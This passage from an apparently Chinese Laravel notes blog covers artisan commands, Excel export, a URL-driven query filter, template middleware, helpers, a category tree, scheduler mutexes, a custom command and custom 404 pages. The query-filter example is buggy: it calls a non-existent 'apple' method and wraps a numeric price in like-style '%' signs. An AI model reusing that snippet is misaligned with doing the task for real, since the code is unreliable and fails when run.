[--database[="..."]] [--force] [--pretend]</span><br><span class="line">// migrations 数据库表信息</span><br><span class="line">php artisan migrate:status</span><br><span class="line"></span><br><span class="line">// 为数据库消息通知创建一个表迁移类</span><br><span class="line">php artisan notifications:table</span><br><span class="line">// 清除缓存的 bootstrap 文件</span><br><span class="line">php artisan optimize:clear</span><br><span class="line">// 扩展包自动发现</span><br><span class="line">php artisan package:discover</span><br><span class="line"></span><br><span class="line">// 为队列数据库表创建一个新的迁移</span><br><span class="line">php artisan queue:table</span><br><span class="line">// 监听指定的队列</span><br><span class="line">// --queue      被监听的队列</span><br><span class="line">// --delay      给执行失败的任务设置延时时间 (默认为零: 0)</span><br><span class="line">// --memory     内存限制大小，单位为 MB (默认为: 128)</span><br><span class="line">// --timeout    指定任务运行超时秒数 (默认为: 60)</span><br><span class="line">// --sleep      等待检查队列任务的秒数 (默认为: 3)</span><br><span class="line">// --tries      任务记录失败重试次数 (默认为: 0)</span><br><span class="line">php artisan queue:listen [--queue[="..."]] [--delay[="..."]] [--memory[="..."]] [--timeout[="..."]] [--sleep[="..."]] [--tries[="..."]] [connection]</span><br><span class="line">// 查看所有执行失败的队列任务</span><br><span class="line">php artisan queue:failed</span><br><span class="line">// 为执行失败的数据表任务创建一个迁移</span><br><span class="line">php artisan queue:failed-table</span><br><span class="line">// 清除所有执行失败的队列任务</span><br><span class="line">php artisan queue:flush</span><br><span class="line">// 删除一个执行失败的队列任务</span><br><span class="line">php artisan queue:forget</span><br><span class="line">// 在当前的队列任务执行完毕后, 重启队列的守护进程</span><br><span class="line">php artisan queue:restart</span><br><span class="line">// 对指定 id 的执行失败的队列任务进行重试(id: 失败队列任务的 ID)</span><br><span class="line">php artisan queue:retry id</span><br><span class="line">// 指定订阅 Iron.io 队列的链接</span><br><span class="line">// queue: Iron.io 的队列名称.</span><br><span class="line">// url: 将被订阅的 URL.</span><br><span class="line">// --type       指定队列的推送类型.</span><br><span class="line">php artisan queue:subscribe [--type[="..."]] queue url</span><br><span class="line">// 处理下一个队列任务</span><br><span class="line">// --queue      被监听的队列</span><br><span class="line">// --daemon     在后台模式运行</span><br><span class="line">// --delay      给执行失败的任务设置延时时间 (默认为零: 0)</span><br><span class="line">// --force      强制在「维护模式下」运行</span><br><span class="line">// --memory     内存限制大小，单位为 MB (默认为: 128)</span><br><span class="line">// --sleep      当没有任务处于有效状态时, 设置其进入休眠的秒数 (默认为: 3)</span><br><span class="line">// --tries      任务记录失败重试次数 (默认为: 0)</span><br><span class="line">php artisan queue:work [--queue[="..."]] [--daemon] [--delay[="..."]] [--force] [--memory[="..."]] [--sleep[="..."]] [--tries[="..."]] [connection]</span><br><span class="line"></span><br><span class="line">// 生成路由缓存文件来提升路由效率</span><br><span class="line">php artisan route:cache</span><br><span class="line">// 移除路由缓存文件</span><br><span class="line">php artisan route:clear</span><br><span class="line">// 显示已注册过的路由</span><br><span class="line">php artisan route:list</span><br><span class="line"></span><br><span class="line">// 运行计划命令</span><br><span class="line">php artisan schedule:run</span><br><span class="line"></span><br><span class="line">// 为 session 数据表生成迁移文件</span><br><span class="line">php artisan session:table</span><br><span class="line">// 创建 "public/storage" 到 "storage/app/public" 的软链接</span><br><span class="line">php artisan storage:link</span><br><span class="line"></span><br><span class="line">// 从 vendor 的扩展包中发布任何可发布的资源</span><br><span class="line">// --force        重写所有已存在的文件</span><br><span class="line">// --provider     指定你想要发布资源文件的服务提供者</span><br><span class="line">// --tag          指定你想要发布标记资源.</span><br><span class="line">php artisan vendor:publish [--force] [--provider[="..."]] [--tag[="..."]]</span><br><span class="line">php artisan tail [--path[="..."]] [--lines[="..."]] [connection]</span><br><span class="line"></span><br><span class="line">// 缓存视图文件以提高效率</span><br><span class="line">php artisan view:cache</span><br><span class="line">// 清除视图文件缓存</span><br><span class="line">php artisan view:clear</span><br><span class="line"></span><br><span class="line">https://laravelcode.cn/docs/5.8</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-Excel"><a href="#Laravel-Excel" class="headerlink" title="Laravel Excel"></a>Laravel Excel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> maatwebsite/excel</span><br><span class="line">php artisan vendor:publish --provider=<span class="string">"Maatwebsite\Excel\ExcelServiceProvider"</span></span><br><span class="line"></span><br><span class="line">php artisan make:<span class="keyword">export</span> UsersExport --model=User</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Exports;</span><br><span class="line"></span><br><span class="line">use App\User;</span><br><span class="line">use Maatwebsite\Excel\Concerns\FromCollection;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UsersExport</span> <span class="title">implements</span> <span class="title">FromCollection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">collection</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> User::all();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">控制器中调用</span><br><span class="line"></span><br><span class="line">use App\Exports\UsersExport;</span><br><span class="line">use Maatwebsite\Excel\Facades\Excel;</span><br><span class="line">use App\Http\Controllers\Controller;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UsersController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">export</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Excel::download(<span class="keyword">new</span> UsersExport, <span class="string">'users.xlsx'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/29089</span></span><br></pre></td></tr></table></figure>
<h3 id="模型过滤"><a href="#模型过滤" class="headerlink" title="模型过滤"></a>模型过滤</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Book::query()</span><br><span class="line">        -&gt;where(<span class="string">'title'</span>, <span class="string">'like'</span>, <span class="string">'%我们%'</span>)</span><br><span class="line">        -&gt;where(<span class="string">'price'</span>, <span class="string">'&gt;='</span>, <span class="number">30</span>)</span><br><span class="line">        -&gt;where(<span class="string">'publisher'</span>, <span class="string">'大地出版社'</span>)</span><br><span class="line">        -&gt;orderBy(<span class="string">'id'</span>, <span class="string">'DESC'</span>)</span><br><span class="line">        -&gt;get();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abstract <span class="class"><span class="keyword">class</span> <span class="title">QueryFilter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    protected $request;</span><br><span class="line">    protected $builder;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Request $request</span>)                                                                        </span></span><br><span class="line"><span class="function">    </span>&#123;                                                                                                                    </span><br><span class="line">        $<span class="keyword">this</span>-&gt;request = $request;                                                                                       </span><br><span class="line">    &#125;                                                                                                                    </span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">apply</span>(<span class="params">Builder $builder</span>)                                                                              </span></span><br><span class="line"><span class="function">    </span>&#123;                                                                                                                    </span><br><span class="line">        $<span class="keyword">this</span>-&gt;builder = $builder;                                                                                       </span><br><span class="line"></span><br><span class="line">        foreach ($<span class="keyword">this</span>-&gt;filters() <span class="keyword">as</span> $name =&gt; $value) &#123;                                                                  </span><br><span class="line">            <span class="keyword">if</span> (method_exists($<span class="keyword">this</span>, $name)) &#123;                                                                           </span><br><span class="line">                call_user_func_array([$<span class="keyword">this</span>, $name], array_filter([$value]));                                            </span><br><span class="line">        &#125;                                                                                                            </span><br><span class="line">     &#125;                                                                                                                </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;builder;                                                                                           </span><br><span class="line">    &#125;                                                                                                                    </span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">filters</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;request-&gt;all();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookFilter</span> <span class="keyword">extends</span> <span class="title">QueryFilter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">title</span>(<span class="params">$title</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;builder-&gt;where(<span class="string">'title'</span>, <span class="string">'like'</span>, <span class="string">"%&#123;$title&#125;%"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">price</span>(<span class="params">$price</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;builder-&gt;where(<span class="string">'price'</span>, <span class="string">'&gt;='</span>, <span class="string">"%&#123;$price&#125;%"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">publisher</span>(<span class="params">$publisher</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;builder-&gt;where(<span class="string">'publisher'</span>, $publisher);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">通过 URL 的参数来进行动态查询。</span><br><span class="line"></span><br><span class="line">books?title=我们    <span class="comment">//  查找标题含有我们的图书</span></span><br><span class="line"></span><br><span class="line">books?title=我们&amp;price=<span class="number">25</span>   <span class="comment">//  查找标题含有我们并且价格大于25元的图书</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">scopeFilter</span>(<span class="params">$query, QueryFilter $filters</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $filters-&gt;apple($query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">最后，我们原来控制器的方法将改为下面的样子：</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">BookFilter $filters</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Book::filter($filters)-&gt;get();</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/29100#reply91762</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-配置双模板"><a href="#Laravel-配置双模板" class="headerlink" title="Laravel 配置双模板"></a>Laravel 配置双模板</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> whichbrowser/parser</span><br><span class="line">php artisan make:middleware Template</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $except = [];</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">$request, Closure $next</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = <span class="keyword">new</span> WhichBrowser\Parser(getallheaders());</span><br><span class="line">        <span class="comment">// 如果是桌面类型, 返回true</span></span><br><span class="line">        $isDesktop = $result-&gt;isType(<span class="string">'desktop'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($isDesktop) &#123;</span><br><span class="line">            <span class="comment">// 加载pc端的模板文件</span></span><br><span class="line">            $path = resource_path(<span class="string">'views/pc/'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 加载mobile端的模板文件</span></span><br><span class="line">            $path = resource_path(<span class="string">'views/mobile/'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取视图查找器实例</span></span><br><span class="line">        $view = app(<span class="string">'view'</span>)-&gt;getFinder();</span><br><span class="line">        <span class="comment">// 重新定义视图目录</span></span><br><span class="line">        $view-&gt;prependLocation($path);</span><br><span class="line">        <span class="comment">// 返回请求</span></span><br><span class="line">        <span class="keyword">return</span> $next($request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">protected $middleware = [</span><br><span class="line">    \App\Http\Middleware\Template::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">return</span> view(<span class="string">'registration.index'</span>, $data);</span><br><span class="line">如从 PC 设备打开网页：加载 /resources/views/pc/registration/index.blade.php 模板</span><br><span class="line"></span><br><span class="line">如从移动设备打开网页：加载 /resources/views/mobile/registration/index.blade.php 模板</span><br><span class="line">https:<span class="comment">//learnku.com/articles/24789</span></span><br></pre></td></tr></table></figure>
<h3 id="助手函数"><a href="#助手函数" class="headerlink" title="助手函数"></a>助手函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:provider HelperServiceProvider</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    foreach(glob(app_path(<span class="string">'Helpers'</span>) . <span class="string">'/*.php'</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        require_once $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">App\Providers\HelperServiceProvider::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">carbon</span>($<span class="title">time</span> </span>= <span class="literal">null</span>, $tz = <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> \Carbon\Carbon($time, $tz);</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//blog.foof.dev/posts/laravel-elegant-add-helper-function-0</span></span><br></pre></td></tr></table></figure>
<h3 id="创建无限极分类树"><a href="#创建无限极分类树" class="headerlink" title="创建无限极分类树"></a>创建无限极分类树</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getList</span>(<span class="params">$catList</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $treeData = [];</span><br><span class="line">    foreach ($catList <span class="keyword">as</span> &amp;$item) &#123;</span><br><span class="line">        $parent_id = $item[<span class="string">'parent_id'</span>];</span><br><span class="line">        <span class="keyword">if</span> (isset($catList[$parent_id]) &amp;&amp; !empty($catList[$parent_id])) &#123;</span><br><span class="line">            $catList[$parent_id][<span class="string">'list'</span>][] = &amp;$catList[$item[<span class="string">'id'</span>]];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $treeData[] = &amp;$catList[$item[<span class="string">'id'</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unset($item);</span><br><span class="line">    <span class="keyword">return</span> $treeData[<span class="number">0</span>][<span class="string">'list'</span>]; <span class="comment">// 根节点只有中华人民共和国，所以直接返回中国的所有子节点</span></span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30088</span></span><br></pre></td></tr></table></figure>
<h3 id="任务重复执行"><a href="#任务重复执行" class="headerlink" title="任务重复执行"></a>任务重复执行</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">当前任务还没有执行完毕的时候另一个相同的任务也会执行，从而导致任务重复。例如想象一下我们执行每分钟生成一次报告的任务，在经过一段时间后，数据量变得很大导致执行时间多于 <span class="number">1</span> 分钟，这样就会导致在上一个任务还没结束的时候另一个相同的任务开始执行</span><br><span class="line"></span><br><span class="line">当我们在开会进行激烈的讨论时，我会从我桌子里拿出来一个尖叫鸡。只有手里拿着尖叫鸡的人才能说话，如果你没有拿着尖叫鸡你是不能说话的。你只能向会议主持人请示，只有在你拿到尖叫鸡的时候你才能说话否则只能等待。当你讲话完毕的时候，将尖叫鸡还给会议主持人，主持人会将尖叫鸡给到下一个人来让其说话。这样会确保人们不会互相交谈，同时他们也会有自己的时间来进行讲话。</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params">Event $event</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;cache-&gt;add($event-&gt;mutexName(), <span class="literal">true</span>, <span class="number">1440</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">exists</span>(<span class="params">Event $event</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;cache-&gt;has($event-&gt;mutexName());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">forget</span>(<span class="params">Event $event</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $<span class="keyword">this</span>-&gt;cache-&gt;forget($event-&gt;mutexName());</span><br><span class="line">&#125;</span><br><span class="line">register_shutdown_function(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    $<span class="keyword">this</span>-&gt;removeMutex();</span><br><span class="line">&#125;);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30550</span></span><br></pre></td></tr></table></figure>
<h3 id="创建一个命令"><a href="#创建一个命令" class="headerlink" title="创建一个命令"></a>创建一个命令</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:command HashCommand</span><br><span class="line">$signature 属性，设置命令名、命令参数、命令选项；</span><br><span class="line">$description 属性，设置命令的描述信息；</span><br><span class="line">handle() 方法，包含实际的命令逻辑代码。</span><br><span class="line">修改 $signature 属性，设置 hash 命令的命令名、命令参数、命令选项：</span><br><span class="line"></span><br><span class="line">protected $signature = <span class="string">'hash &#123;text&#125; &#123;--U|uppercase&#125;'</span>;</span><br><span class="line">  public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = $<span class="keyword">this</span>-&gt;argument(<span class="string">'text'</span>);</span><br><span class="line">        $uppercase = $<span class="keyword">this</span>-&gt;option(<span class="string">'uppercase'</span>);</span><br><span class="line"></span><br><span class="line">        $md5text = $uppercase ? strtoupper(md5($text)) : md5($text);</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;info(<span class="string">"md5('&#123;$text&#125;') = $md5text"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">$ php artisan hash <span class="string">"hello world"</span></span><br><span class="line">md5(<span class="string">'hello world'</span>) = <span class="number">5</span>eb63bbbe01eeed093cb22bb8f5acdc3</span><br><span class="line">带上 -U 选项：</span><br><span class="line"></span><br><span class="line">$ php artisan hash <span class="string">"hello world"</span> -U</span><br><span class="line">md5(<span class="string">'hello world'</span>) = <span class="number">5</span>EB63BBBE01EEED093CB22BB8F5ACDC3</span><br></pre></td></tr></table></figure>
<h3 id="自定义-Laravel-的-404-页面"><a href="#自定义-Laravel-的-404-页面" class="headerlink" title="自定义 Laravel 的 404 页面"></a>自定义 Laravel 的 404 页面</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">app/Exceptions/Handler.php 文件中修改 render 方法</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">$request, Exception $exception</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;isHttpException($exception)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($exception-&gt;getStatusCode() == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> response()-&gt;view(<span class="string">'errors.'</span> . <span class="string">'404'</span>, [], <span class="number">404</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parent::render($request, $exception);</span><br><span class="line">&#125;创建一个新的视图 errors/<span class="number">404.</span>blade.php 。</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">$request, Exception $exception</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;isHttpException($exception)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (view()-&gt;exists(<span class="string">'errors.'</span> . $exception-&gt;getStatusCode())) &#123;</span><br><span class="line">            <span class="keyword">return</span> response()-&gt;view(<span class="string">'errors.'</span> . $exception-&gt;getStatusCode(), [], $exception-&gt;getStatusCode());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parent::render($request, $exception);</span><br><span class="line">&#125;</span><br><span class="line">创建一个 自定义异常 。运行以下代码来创建一个名为 TestingHttpException 的异常。</span><br><span class="line"></span><br><span class="line">php artisan make:exception TestingHttpException</span><br><span class="line">在  app/Exceptions/Handler.php  文件中，修改 render 方法。</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">$request, Exception $exception</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($exception <span class="keyword">instanceof</span> TestingHttpException) &#123;</span><br><span class="line">        <span class="keyword">return</span> response()-&gt;view(<span class="string">'errors.testing'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> parent::render($request, $exception);</span><br><span class="line">&#125;</span><br><span class="line">如果异常是 TestingHttpException 的实例，它将返回 errors.testing 视图。https:<span class="comment">//learnku.com/laravel/t/27873</span></span><br></pre></td></tr></table></figure>
<h3 id="图片处理"><a href="#图片处理" class="headerlink" title="图片处理"></a>图片处理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> intervention/image  https:<span class="comment">//learnku.com/laravel/t/30978</span></span><br><span class="line"> <span class="comment">// 创建一张空的画布，像素3628x1757，背景白色</span></span><br><span class="line">   $img = Image::canvas(<span class="number">3628</span>, <span class="number">1757</span>, <span class="string">'#fff'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取本地图片，可以获取input上传文件</span></span><br><span class="line">     $leftImage = Image::make(base_path().<span class="string">'/public/p.jpg'</span>)-&gt;resize(<span class="number">2255</span>, <span class="number">1305</span>);</span><br><span class="line">     $rightImage = Image::make(base_path().<span class="string">'/public/f.jpg'</span>)-&gt;resize(<span class="number">1000</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 